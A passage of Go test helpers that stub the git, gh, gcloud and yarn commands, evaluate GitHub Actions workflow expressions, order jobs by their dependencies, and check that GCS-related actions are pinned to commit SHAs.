	writeExe(t, filepath.Join(dir, "git"), "#!/bin/bash\nif [ \"$1\" = rev-parse ]; then echo 79b51878149c7325f7efcd069c126daab22483ae; exit 0; fi\nexit 0\n")
	writeExe(t, filepath.Join(dir, "gh"), `#!/bin/bash
args="$*"
if [[ "$args" == *"/files"* ]]; then
  printf '%s\n' "public/app/features/dashboard/state/DashboardModel.ts"
  exit 0
fi
if [[ "$args" == *"/git/ref/"* ]]; then
  printf '%s\n' "79b51878149c7325f7efcd069c126daab22483ae"
  exit 0
fi
printf '%s\n' '{"head":{"sha":"79b51878149c7325f7efcd069c126daab22483ae","repo":{"full_name":"grafana/grafana"}}}'
exit 0
`)
	writeExe(t, filepath.Join(dir, "gcloud"), "#!/bin/bash\nexit 0\n")
	writeExe(t, filepath.Join(dir, "yarn"), "#!/bin/bash\nexit 0\n")
	return dir
}

func writeExe(t *testing.T, path, body string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
}

func copyFile(t *testing.T, src, dst string) {
	t.Helper()
	in, err := os.ReadFile(src)
	if err != nil {
		return
	}
	if err := os.WriteFile(dst, in, 0o644); err != nil {
		t.Fatal(err)
	}
}

func mustDir(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0o755); err != nil {
		t.Fatal(err)
	}
}

func readOutput(path string) map[string]string {
	raw, err := os.ReadFile(path)
	if err != nil {
		return map[string]string{}
	}
	out := map[string]string{}
	for _, line := range strings.Split(string(raw), "\n") {
		key, val, ok := strings.Cut(line, "=")
		if ok {
			out[key] = val
		}
	}
	return out
}

func unpinnedGCS(path, ref string) bool {
	if isSHA(ref) {
		return false
	}
	return strings.Contains(path, "login-to-gcs") || strings.Contains(path, "push-to-gcs")
}

func isSHA(ref string) bool {
	if len(ref) != 40 {
		return false
	}
	for _, r := range ref {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f')) {
			return false
		}
	}
	return true
}

func isLocal(uses string) bool {
	return strings.HasPrefix(uses, "./")
}

func allowLocal(uses string) bool {
	return strings.Contains(uses, "frontend-preview-check") || strings.Contains(uses, "change-detection")
}

func splitUses(uses string) (repo, ref, path string) {
	at := strings.LastIndex(uses, "@")
	ref = uses[at+1:]
	left := uses[:at]
	parts := strings.SplitN(left, "/", 3)
	if len(parts) >= 2 {
		repo = parts[0] + "/" + parts[1]
	}
	if len(parts) == 3 {
		path = parts[2]
	}
	return repo, ref, path
}

func workflowFile(uses string) string {
	_, _, path := splitUses(uses)
	return filepath.Base(path)
}

func needIDs(v any) []string {
	switch n := v.(type) {
	case string:
		return []string{n}
	case []any:
		var out []string
		for _, item := range n {
			out = append(out, fmt.Sprint(item))
		}
		return out
	default:
		return nil
	}
}

func topo(t *testing.T, jobs map[string]any) []string {
	t.Helper()
	indeg := map[string]int{}
	next := map[string][]string{}
	for id, raw := range jobs {
		indeg[id] = 0
		_ = raw
	}
	for id, raw := range jobs {
		for _, need := range needIDs(asMap(raw)["needs"]) {
			next[need] = append(next[need], id)
			indeg[id]++
		}
	}
	var ready []string
	for id, n := range indeg {
		if n == 0 {
			ready = append(ready, id)
		}
	}
	// Stable order for the release publish jobs.
	sortStrings(ready)
	var out []string
	for len(ready) > 0 {
		id := ready[0]
		ready = ready[1:]
		out = append(out, id)
		var kids []string
		for _, kid := range next[id] {
			indeg[kid]--
			if indeg[kid] == 0 {
				kids = append(kids, kid)
			}
		}
		sortStrings(kids)
		ready = append(ready, kids...)
	}
	if len(out) != len(jobs) {
		t.Fatalf("job graph cycle: %v", jobsKeys(jobs))
	}
	return out
}

func sortStrings(s []string) {
	for i := 1; i < len(s); i++ {
		for j := i; j > 0 && s[j] < s[j-1]; j-- {
			s[j], s[j-1] = s[j-1], s[j]
		}
	}
}

func jobsKeys(jobs map[string]any) []string {
	var out []string
	for id := range jobs {
		out = append(out, id)
	}
	sortStrings(out)
	return out
}

type evalCtx struct {
	github map[string]any
	needs  map[string]map[string]string
	inputs map[string]string
	env    map[string]string
	steps  map[string]map[string]string
}

type gval struct {
	null bool
	b    bool
	isB  bool
	s    string
	list []gval
}

func (v gval) String() string {
	if v.null {
		return ""
	}
	if v.isB {
		if v.b {
			return "true"
		}
		return "false"
	}
	if v.list != nil {
		var parts []string
		for _, item := range v.list {
			parts = append(parts, item.String())
		}
		return strings.Join(parts, ",")
	}
	return v.s
}

func truthy(v gval) bool {
	if v.null {
		return false
	}
	if v.isB {
		return v.b
	}
	if v.list != nil {
		return len(v.list) > 0
	}
	return v.s != ""
}

func mustEval(t *testing.T, expr string, ctx *evalCtx) gval {
	t.Helper()
	return evalExpr(expr, ctx)
}

func evalTemplate(s string, ctx *evalCtx) string {
	var b strings.Builder
	for {
		i := strings.Index(s, "${{")
		if i < 0 {
			b.WriteString(s)
			break
		}
		b.WriteString(s[:i])
		rest := s[i+3:]
		j := strings.Index(rest, "}}")
		if j < 0 {
			b.WriteString(s[i:])
			break
		}
		b.WriteString(evalExpr(rest[:j], ctx).String())
		s = rest[j+2:]
	}
	return b.String()
}

func stripOuter(s string) string {
	s = strings.TrimSpace(s)
	if strings.HasPrefix(s, "${{") && strings.HasSuffix(s, "}}") {
		return strings.TrimSpace(s[3 : len(s)-2])
	}
	return s
}

func evalExpr(expr string, ctx *evalCtx) gval {
	p := &parser{s: expr, ctx: ctx}
	v := p.parseOr()
	return v
}

type parser struct {
	s   string
	i   int
	ctx *evalCtx
}

func (p *parser) parseOr() gval {
	left := p.parseAnd()
	for p.match("||") {
		right := p.parseAnd()
		if !truthy(left) {
			left = right
		}
	}
	return left
}

func (p *parser) parseAnd() gval {
	left := p.parseEq()
	for p.match("&&") {
		right := p.parseEq()
		if truthy(left) {
			left = right
		}
	}
	return left
}

func (p *parser) parseEq() gval {
	left := p.parseUnary()
	for {
		if p.match("==") {
			right := p.parseUnary()
			left = gval{isB: true, b: left.String() == right.String(), s: strconv.FormatBool(left.String() == right.String())}
		} else if p.match("!=") {
			right := p.parseUnary()
			eq := left.String() == right.String()
			left = gval{isB: true, b: !eq, s: strconv.FormatBool(!eq)}
		} else {
			break
		}
	}
	return left
}

func (p *parser) parseUnary() gval {
	if p.match("!") {
		return gval{isB: true, b: !truthy(p.parseUnary())}
	}
	return p.parsePrimary()
}

func (p *parser) parsePrimary() gval {
	p.skip()
	if p.match("(") {
		v := p.parseOr()
		p.match(")")
		return v
	}
	if p.peek("'") || p.peek("\"") {
		return p.readString()
	}
	if p.i < len(p.s) && p.s[p.i] >= '0' && p.s[p.i] <= '9' {
		start := p.i
		for p.i < len(p.s) && p.s[p.i] >= '0' && p.s[p.i] <= '9' {
			p.i++
		}
		return gval{s: p.s[start:p.i]}
	}
	name := p.ident()
	switch name {
	case "true":
		return gval{isB: true, b: true, s: "true"}
	case "false":
		return gval{isB: true, b: false, s: "false"}
	case "null", "":
		return gval{null: true}
	}
	if p.match("(") {
		var args []gval
		if !p.peek(")") {
			for {
				args = append(args, p.parseOr())
				if !p.match(",") {
					break
				}
			}
		}
		p.match(")")
		return p.call(name, args)
	}
	path := []string{name}
	for p.match(".") {
		if p.peek("*") {
			p.match("*")
			path = append(path, "*")
			continue
		}
		path = append(path, p.ident())
	}
	return p.lookup(path)
}

func (p *parser) call(name string, args []gval) gval {
	switch name {
	case "startsWith":
		if len(args) != 2 {
			return gval{null: true}
		}
		return gval{isB: true, b: strings.HasPrefix(args[0].String(), args[1].String())}
	case "endsWith":
		if len(args) != 2 {
			return gval{null: true}
		}
		return gval{isB: true, b: strings.HasSuffix(args[0].String(), args[1].String())}
	case "contains":
		if len(args) != 2 {
			return gval{null: true}
		}
		if args[0].list != nil {
			for _, item := range args[0].list {
				if item.String() == args[1].String() {
					return gval{isB: true, b: true}
				}
			}
			return gval{isB: true, b: false}
		}
		return gval{isB: true, b: strings.Contains(args[0].String(), args[1].String())}
	case "cancelled":
		return gval{isB: true, b: false}
	case "success", "always":
		return gval{isB: true, b: true}
	case "failure":
		return gval{isB: true, b: false}
	default:
		return gval{null: true}
	}
}

func (p *parser) lookup(path []string) gval {
	if len(path) == 0 {
		return gval{null: true}
	}
	switch path[0] {
	case "github":
		return lookupAny(p.ctx.github, path[1:])
	case "inputs":
		if len(path) != 2 {
			return gval{null: true}
		}
		v, ok := p.ctx.inputs[path[1]]
		if !ok {
			return gval{null: true}
		}
		return gval{s: v}
	case "env":
		if len(path) != 2 {
			return gval{null: true}
		}
		v, ok := p.ctx.env[path[1]]
		if !ok {
			return gval{null: true}
		}
		return gval{s: v}
	case "needs":
		if len(path) < 4 || path[2] != "outputs" {
			return gval{null: true}
		}
		outs := p.ctx.needs[path[1]]
		v, ok := outs[path[3]]
		if !ok {
			return gval{null: true}
		}
		return gval{s: v}
	case "steps":
		if len(path) < 4 || path[2] != "outputs" {
			return gval{null: true}
		}
		outs := p.ctx.steps[path[1]]
		v, ok := outs[path[3]]
		if !ok {
			return gval{null: true}
		}
		return gval{s: v}
	default:
		return gval{null: true}
	}
}

func lookupAny(cur any, path []string) gval {
	if len(path) == 0 {
		return fromAny(cur)
	}
	if path[0] == "*" {
		items, ok := cur.([]any)
		if !ok {
			return gval{null: true}
		}
		var list []gval
		for _, item := range items {
			list = append(list, lookupAny(item, path[1:]))
		}
		return gval{list: list}
	}
	m, ok := cur.(map[string]any)
	if !ok {
		return gval{null: true}
	}
	next, ok := m[path[0]]
	if !ok {
		return gval{null: true}
	}
	return lookupAny(next, path[1:])
}

func fromAny(v any) gval {
	switch n := v.(type) {
	case nil:
		return gval{null: true}
	case bool:
		return gval{isB: true, b: n, s: strconv.FormatBool(n)}
	case string:
		return gval{s: n}
	case int:
		return gval{s: strconv.Itoa(n)}
	case float64:
		return gval{s: strconv.FormatFloat(n, 'f', -1, 64)}
	default:
		if n == nil {
			return gval{null: true}
		}
		return gval{s: fmt.Sprint(n), isB: fmt.Sprint(n) == "true" || fmt.Sprint(n) == "false", b: fmt.Sprint(n) == "true"}
	}
}

func (p *parser) readString() gval {
	q := p.s[p.i]
	p.i++
	start := p.i
	for p.i < len(p.s) && p.s[p.i] != q {
		p.i++
	}
	s := p.s[start:p.i]
	if p.i < len(p.s) {
		p.i++
	}
	return gval{s: s}
}

func (p *parser) ident() string {
	p.skip()
	start := p.i
	for p.i < len(p.s) {
		c := p.s[p.i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_' || c == '-' {
			p.i++
			continue
		}
		break
	}
	return p.s[start:p.i]
}

func (p *parser) match(tok string) bool {
	p.skip()
	if strings.HasPrefix(p.s[p.i:], tok) {
		p.i += len(tok)
		return true
	}
	return false
}

func (p *parser) peek(tok string) bool {
	p.skip()
	return strings.HasPrefix(p.s[p.i:], tok)
}

func (p *parser) skip() {
	for p.i < len(p.s) {
		switch p.s[p.i] {
		case ' ', '\n', '\t', '\r':
			p.i++
		default:
			return
		}
	}
}

func evalStringMap(m map[string]any, ctx *evalCtx) map[string]string {
	out := map[string]string{}
	for k, v := range m {
		out[k] = evalTemplate(fmt.Sprint(v), ctx)
	}
	return out
}

func mergeEnv(a, b map[string]string) map[string]string {
	out := map[string]string{}
	for k, v := range a {
		out[k] = v
	}
	for k, v := range b {
		out[k] = v
	}
	return out
}

func readYAML(t *testing.T, path string) map[string]any {
	t.Helper()
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	var doc map[string]any
	if err := yaml.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("parse %s: %v", path, err)
	}
	return doc
}

func asMap(v any) map[string]any {
	m, _ := v.(map[string]any)
	if m == nil {
		return map[string]any{}
	}
	return m
}

func asString(v any) (string, bool) {
	s, ok := v.(string)
	return s, ok
}

func moduleRoot(t *testing.T) string {
	t.Helper()
	dir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Fatal("go.mod not found")
		}
		dir = parent
	}
}

func objectKeys(objects map[string][]byte) []string {
	var keys []string
	for k := range objects {
		keys = append(keys, k)
	}
	sortStrings(keys)
	return keys
}
